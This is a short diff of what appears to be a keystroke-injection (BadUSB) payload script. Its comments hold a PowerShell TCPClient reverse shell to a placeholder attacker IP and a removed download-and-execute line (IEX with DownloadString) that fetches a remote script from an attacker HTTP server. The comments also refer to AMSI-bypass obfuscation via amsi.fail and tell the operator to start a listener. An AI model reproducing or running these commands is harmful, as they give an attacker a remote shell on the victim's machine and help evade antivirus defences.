@@ -6,9 +6,7 @@ REM \$client = New-Object System.Net.Sockets.TCPClient('ATTACKER-IP',PORTNUMBER)
 REM
 REM Don't forget ro start http server & your listener
 REM
-REM IEX (New-Object Net.WebClient).DownloadString('http://ATACKER-IP:PORT/Invoke-Powershellshell.ps1')
-REM
-REM Obfuscated on https://amsi.fail/ should work for many IPs without a need to change
+REM Obfuscated on https://amsi.fail/ 
 
 
 DELAY 1500
